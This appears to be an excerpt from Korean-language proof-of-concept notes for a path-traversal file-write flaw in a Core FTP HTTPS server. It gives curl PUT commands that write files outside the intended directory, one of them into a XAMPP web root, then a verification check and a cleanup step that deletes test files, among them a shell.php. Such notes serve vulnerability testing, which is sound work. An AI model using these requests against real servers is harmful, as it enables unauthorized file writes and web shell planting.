...
```bash
curl -k -i -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```
...
```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "coreftp-proof" --path-as-is https://<IP>/../../../../../../xampp/htdocs/proof.txt
curl -i http://<IP>/proof.txt
```

확인할 출력:

- `proof.txt` 조회 시 `coreftp-proof`가 반환되면 웹 루트 파일 쓰기 성공이다.
...
```cmd
del /f /q "C:\whoops"
del /f /q "C:\xampp\htdocs\proof.txt"
del /f /q "C:\xampp\htdocs\shell.php"
dir "C:\xampp\htdocs\proof.txt" "C:\xampp\htdocs\shell.php"
```
